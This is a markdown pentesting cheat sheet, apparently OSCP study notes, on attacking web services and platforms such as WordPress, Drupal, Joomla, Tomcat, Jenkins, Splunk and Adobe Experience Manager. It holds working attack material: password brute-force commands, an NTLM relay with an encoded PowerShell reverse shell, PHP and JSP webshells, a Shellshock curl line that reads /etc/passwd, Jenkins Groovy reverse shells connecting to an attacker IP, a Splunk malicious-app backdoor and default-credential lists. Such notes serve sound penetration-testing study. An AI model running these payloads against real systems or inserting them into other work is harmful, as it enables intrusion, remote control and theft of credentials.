---
layout: blank
pagetitle: Attacking Services
---


**The best methodology for pentesting services is to usually just search "Pentesting {service name}"**

[https://github.com/saisathvik1/OSCP-Cheatsheet?tab=readme-ov-file](https://github.com/saisathvik1/OSCP-Cheatsheet?tab=readme-ov-file)
- Scroll down for services scanning

## Wordpress

**WPScan**
- Use `wpscan` and investigate the plugins
	- `wpscan --url http://{IP} --enumerate --plugins-detection aggressive --random-user-agent --api-token {token}`
		- `--enumerate` will automatically enumerate plugins, themes, and users, but we can cut it down to something like `--enumerate vp,vt,u`
	- Look for `[!] This version is out of date`
		- Can use searchsploit for these plugins or the wpscan vuln database
- Can also brute force logins
	- `sudo wpscan --password-attack xmlrpc -t {threads_eg_20} -U {username} -P /usr/share/wordlists/rockyou.txt --url {wp_site}`

**Misc**
- Seems the WP admin creds (if there even are some) are no longer admin/test, but rather admin/password
- xmlrpc.php
  - Can be exploited in a number of ways
  - [https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit/tree/master](https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit/tree/master) - password brute forcing tool
  - [https://github.com/rm-onata/xmlrpc-attack](https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit/tree/master) - general attacking tool?
- If signed into the wordpress page
	- Check out plugins from the inside
	- Check out the Backup Migration
		- Changing this to our IP can allow us to relay authentication (if signing is disabled)
		- `//{kali_ip}/test` with `sudo impacket-ntlmrelayx --no-http-server -smb2support -t {relay_target_IP} -c "powershell -enc {reverse_shell}"`
	- Try to upload a shell
		- msf's `unix/webapp/wp_admin_shell_upload` will do it automatically

## Github
- Use `gato-x` to enumerate entire organizations
  - [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
  - `gato-x enum --target {org_name}`
    - Requires a `GH_TOKEN` environment variable; just add `export GH_TOKEN="{token}"` to shell config file
- Use `noseyparker` to scan entire organizations for passwords
  - [https://github.com/praetorian-inc/noseyparker](https://github.com/praetorian-inc/noseyparker)
  - `noseyparker scan --github-org={org_name}`

## Drupal
- [droopescan](plugins/system/cache/cache.xml)
  - `droopescan scan drupal -u {url}`
- Get version from `/CHANGELOG.txt`
- Command execution as admin before version 8
  - Enable `PHP filter` module and Save, allowing embedded php code to be executed 
  - Go to Content > Add content and create a basic page
  - Add something like `<?php system($_GET['cmd']);?>` and set Text format to PHP code, and Save
  - Should be redirected to the page, but it'll be at something like `/node/{node_number_eg_3}`
- Command execution as admin after version 8
  - PHP filter isn't installed by default, so get latest from [https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz](https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz)
  - Then go to Administrator > Reports > Available updates, and upload the tar.gz
  - Then repeat steps above
- Uploading backdoored module
  - Some privileged users can upload modules
    - These modules are just zipped php code, so we can add a php shell
  - `wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz && tar xvzf captcha-8.x-1.2.tar.gz`
  - Create a PHP shell with `<?php system($_GET['cmd']);?>`
  - Create an `.htaccess` file (as otherwise we won't be able to directly access the modules folder) with:

```xml
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

  - Add both of these files to the plugin root directory and `tar cvf captcha.tar.gz captcha/`
  - Then, go to Manage > Extend, and Install new module
  - Upload the backdoored module and install, and shell will be at `/modules/{backdoored_module}/{php_shell_file}`


## Joomla
- [droopescan](https://github.com/SamJoan/droopescan)
  - `droopescan scan joomla -u {url}`
- [JoomlaScan](https://github.com/drego85/JoomlaScan)
  - Requires python 2.7 and some dependencies - `sudo python2.7 -m pip install urllib3 certifi bs4`
  - `python2.7 joomlascan.py -u {url}`
- Can get version from `/README.txt`, `media/system/js/`, `administrator/manifests/files/joomla.xml`, or approx at `plugins/system/cache/cache.xml`
- `sudo python3 joomla-brute.py -u {url} -w passwords.txt -usr {username}`
    - [https://github.com/ajnik/joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce)
- default username is `admin`
- Command execution as administrator:
  - Go to `/administrator`
    - If "Call to a member function" error appears, go to `administrator/index.php?option=com_plugins` and disable "Quick Icon - PHP Version Check"
  - Go to Configuration > Templates and choose one
  - Click on a php page to bring up the source, and add something like `system($_GET['cmd']);`

## Tomcat
- Used for hosting Java-based frameworks (used to be for Java Server Pages (JSP) scripts)
- Version in `/docs/`
- `/conf/tomcat-users.xml` stores user creds and roles, try `tomcat/tomcat` or `admin/admin`
- Commnand execution as administrator:
  - Can upload a `.war` file (tomcat application) to compromise the app
  - Navigate to `/manager/html` and upload the following file, zipped into an archive titled `{app_name}.war`

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

  - Then, after deploying, go to `/{app_name}/cmd.jsp?cmd={command}`
  - Can also just use msf's `multi/http/tomcat_mgr_upload` 

**Tomcat Common Gateway Interface (CGI)**
- CGI scripts, usually written in python, bash, or perl, are used to communicate/interact with external resources (like databases)
- Default directory is `/cgi/` or `/cgi-bin`, and we can fuzz them for `.cmd, .bat, .py, .perl, .sh`
  - If we find batch scripts, try passing additional arguments to them as so: `/welcome.bat?&{command}`
  - Shellshock is an old CVE, but can be pretty prevalent on IoT devices
    - Explotiation takes advantage of setting an environment variable allowing command execution
    - `curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' {server}/cgi-bin/access.cgi`

## Email
- [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)
  - `smtp-user-enum -M {VRFY/RCPT/EXPN} -U {username_list} -D {domain} -t {ip}`
- [o365spray](https://github.com/0xZDH/o365spray)
  - `python3 o365spray.py --enum -U {username_list} --domain {domain}`
- Open relay (send emails from the server)
  - nmap's `--script smtp-open-relay` will check
  - To send an email: `swaks --from {from_email} --to {to_email} --header '{header}' --body '{body}' --server {ip}`

## SNMP
- Protocol used to monitor devices in a network
  - Uses a Management Information Base (MIB) for information storage
    - Text file where queryable objects are listed in a hierarchy, containing unique object identifiers (OIDs), access rights, and descriptions (which could have passwords)
      - OIDs are basically numbers like `1.3.6.1.4.1.1452.1.2.5.1.3.21.1.4.7` with each number meaning some BS about what org and stuff
- Run `snmpwalk {IP}` and check output for sensitive information, such as usernames, passwords, shell scripts run, etc.
  - If version 1 or 2, use `-v {number}` and pass read string with `-c {string}`
    - Default read string is `public` and default write string is `private`, which are used for authentication
- [braa](https://github.com/mteg/braa) can enumerate hidden data quickly
  - `braa {community_string}@{IP}:.1.3.6.*`
  - Then grep for `trap` to find the private community string, `login` or `fail` to search for failed logins, or `@` for email addresses
- Can be used for RCE given a few caveats: [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/snmp-rce.html](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/snmp-rce.html)

## MQTT
- A service, usually for IoT devices, which allows the publishing of and subscribing to information
  - Port 1883 for plaintext, port 8883 for TLS
  - **NMAP CAN register it as closed when it's open**
- Anonymous Access
  - In one terminal, listen with `mosquitto_sub -h {IP} -t "test_topic"`
  - In another terminal, publish to `test_topic` with `mosquitto_pub -h {IP} -t "test_topic" -m "test_message"`
  - If successful, we can publish information to the endpoint
- All-topic read access
  - Use `mosquitto_sub -t "#"` to listen to all topics
  - Publish anything, such as `mosquitto_pub -h {IP} -t "unknown_channel" -m "sensitive_information"`, and see if it appears
- Publish retained messages
  - `mosquitto_pub -h {IP} -t "test_topic" -m "retained_message" -r`
- Auth brute-forcing
  - Hydra supports, so a basic `sudo hydra -l {username_like_admin} -P {passfile} mqtt://{IP}:1883` should do
- [mqtt-explorer](https://mqtt-explorer.com/)
  - Install from debian package with `sudo apt install {package}.deb`


## PHP
- [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php\_reverse\_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) - reverse shell (cross platform)

## Jenkins
- Continues integration server for development
- Will often not require any authntication
- Can run arbitrary commands via Apache Groovy scripts in the Script Console at `/script`
- Linux reverse shell:

```sh
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{kali_ip}/{kali_port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

- Windows reverse shell:

```sh
String host="{kali_ip}";
int port={kali_port};
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Splunk
- Will often not require authentication, or with defaults `admin:changeme` or  `admin:admin/Welcome/Welcome1`
  - This occurs due to Splunk automatically changing to be a free version after 60 days  without payment
- Many ways of command execution, like Django apps, scripted inputs (most common), and alerting scripts
- Can get reverse shells from [this repo](https://github.com/0xjpuff/reverse_shell_splunk)
- Command execution using reverse shell from above:
  - Create custom splunk application (just a folder like "splunk_shell" with two subdirectories, "bin" and "default")
  - "bin" folder should contain the scripts intended to run, including Powershell 1-liner (and `.bat` file to run it) and python revshell
    - These can be found in the above repo, and will need to be edited if intended for unix
  - Create `inputs.conf` in the directory root, which tells Splunk which scripts to run (run script every 10 seconds):

```sh
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

  - Create a tarball with the repo with `tar -czvf {script_name}.tar.gz {script_directory_name}`
  - Then, in `/en-US/manager/search/apps/local` go to "Install app from file" and start the nc listener
  - Upload the tarball and upload, and scripts will be executed
**Compromising deployed hosts from Splunk**
  - If there are hosts deployed from Splunk with a Universal Forwarder installed, we can RCE them as well if we've fully compromised the host
  - To push a reverse shell to those hosts, put application in `{Splunk_root_dir}/etc/deployment-apps` directory on the compromised Splunk machine
    - This app will need to be a powershell revshell on Windows environments since the deployment servers aren't guaranteed to come with Python

## PRTG Network Monitor
- Somewhat common in internal networks for network management
- Default creds of `prtgadmin:prtgadmin`, and versioning should be in the bottom left, with CVEs associated

## osTicket
- Can google search for "Helpdesk software - powered by osTicket", common-ish app used for ticket management (like Jira)
- This can be an extremely useful site for obtaining a company email
  - When submitting a ticket, we may get a notification email like "Send any more details to `{ticket_no}@{company}`"
  - Information sent to the ticket email will appear on the ticketing page, resulting in our "own" corporate email
  - This email can then be used to sign up for tools like Slack, Gitlab, Mattermost, Rocket.chat, Bitbucket, etc.
- Useful for obtaining IT/helpdesk domain users from submitting non-relevant tickets
- Some CVEs associated as well

## Gitlab
- Useful for finding sensitive info, like passwords or SSH keys
- `/help` for fingerprinting version after being logged in
  - Only vuln I'd try without auth would be the critical [account takeover](https://gitlab.com/gitlab-org/gitlab/-/issues/436084)
- Attempt to self-singup at `/users/sign_up`

## ColdFusion
- Programming language and dev platorm based on Java, meant to be hooked up to databases
- ColdFusion Markup Language (CFML) is the programming languaged used for web apps, but can integrate deeper (like performing SQL queries or email management)
- Find version from application error messages; many CVEs exist
- `{cf_root_dir}/lib/password.properties` has encrypted passwords in key-value pairs

## IIS Servers
- Some versions of Microsoft servers create short file names for files ({8_char_filename}.{3_char_extension})
- The server will respond with 200s for matching parts of a filename
  - This means that if a directory like `/secret~1/` exists, the server will return 200s for `/~s`, `/~se`, `/~sec`, and so on, until we reach `/~secret`
    - At this point we can turn `/~secret` into `/secret~1/` and fuzz the contents within the directory
  - Same thing works for filenames, e.g. `/secret~1/somefi~1.txt`
    - `somefile1.txt` would become `somefi~1.txt`, and `somefileextrastuffhere.txt` would become `somefi~2.txt`
- This can be done automatically with [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
  `java -jar iis_shortname_scanner.jar 0 5 http://{server}/`

## AEM (Adobe Experience Manager)
- Enterprise CMS running on top of Apache Sling and a Java Content Repository
- We can identify by finding filepaths ending in `.json` or `.pdf` or by a header like `X-Dispatcher: hu1`
  - We'll also often see calls to `/etc.clientlibs/` for JS
- [Hacktricks info](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/aem-adobe-experience-cloud.html?highlight=AEM#aem-adobe-experience-manager-pentesting)

**Automated Tooling**
- [AEM hacker](github.com/0ang3el/aem-hacker) can enumerate much of this and automatically report back
  - Based on these slides: [https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps](https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps)
- [AEM Scan](github.com/Raz0r/aemscan/tree/master/aemscan) will find and display as many interesting paths as possible (more than AEM hacker in my experience)

**High Value Endpoints**
- Anonymous POST servlet at `/.json` or `/.1.json` allows planting new JCR nodes
  - If blocked, can sometimes be bypassed (see slides above) with something like `/bin/querybuilder.json;%0aa.css?path=/home&type=rep:User`
- `/bin/querybuilder.json?path=/` - leak of page tree, internal paths, usernames
- `/system/console/status-*`, `/system/console/bundles` - bundle upload RCE
- `/crx/packmgr/index.jsp` - authenticated JSP package upload
- `/etc/groovyconsole/**` - groovy console, RCE if exposed
- `/libs/cq/AuditlogSearchServlet.json` - info disclosure
- `/libs/cq/ui/content/dumplibs.html` - XSS vector

**Common Misconfigs**
- Being able to POST to `/.json`, as `:operation=import` allows planting JCR nodes
- Default read on `/home/users/**/profile/*`
- Default creds of `admin:admin`, `author:author`, or `replication:replication`
- Reflected XSS via `?debug=layout`

Basic RCE upload via POST to `/content/evil.jsp`:

```jsp
:contentType=text/plain
jcr:data=<% out.println("pwned"); %>
:operation=import
```

Admin RCE script available here: [https://github.com/0ang3el/aem-hacker/blob/master/aem-rce-sling-script.sh](https://github.com/0ang3el/aem-hacker/blob/master/aem-rce-sling-script.sh), which uploads a malicious app

## Grafana
- Find version info by performing a GET request on `/login` and searching for `"latestVersion"`
- Other tactics: [https://hackviser.com/tactics/pentesting/services/grafana](https://hackviser.com/tactics/pentesting/services/grafana)

## Miscellaneous
- Many of the below have plenty of CVEs, just look em up
- Nagios - default creds of `nagiosadmin:PASSW0RD`
- Websphere - default creds of `system:manager`
- Axis2 - built on top of Tomcat, can deploy webshell in `AAR` file with [msf module](https://packetstorm.news/files/id/96224)
- Elasticsearch - somewhat prevalent CVE: [https://www.exploit-db.com/exploits/36337](https://www.exploit-db.com/exploits/36337)
- Zabbix - has built-in functionality to execute commands
- WebLogic - 190 reported CVEs
- MediaWiki - Many CVEs, especially in added extensions and libraries - also worth searching for sensitive info (see External notes)
- DotNetNuke - has some severe CVEs associated
- vCenter - manages multiple ESXis; Nessus will not pick up on some CVEs like [Apache Strust 2 RCE](https://blog.gdssecurity.com/labs/2017/4/13/vmware-vcenter-unauthenticated-rce-using-cve-2017-5638-apach.html) and [CVE-2021-22005](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22005)

